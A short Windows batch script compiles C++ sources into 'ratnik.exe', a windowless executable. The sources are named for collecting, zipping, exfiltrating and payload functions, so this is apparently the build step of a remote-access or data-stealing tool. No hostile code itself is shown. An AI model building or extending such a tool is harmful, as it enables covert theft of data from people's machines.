@echo off
call "C:\Program Files\Microsoft Visual Studio\18\Community\VC\Auxiliary\Build\vcvars64.bat" >nul 2>&1
cd /d "%~dp0"
cl /nologo /std:c++17 /EHsc /O2 /MT /DUNICODE /D_UNICODE ^
   main.cpp common.cpp zip.cpp collect.cpp exfil.cpp payload.cpp ^
   /Fe:ratnik.exe ^
   /link /SUBSYSTEM:WINDOWS
exit /b %errorlevel%
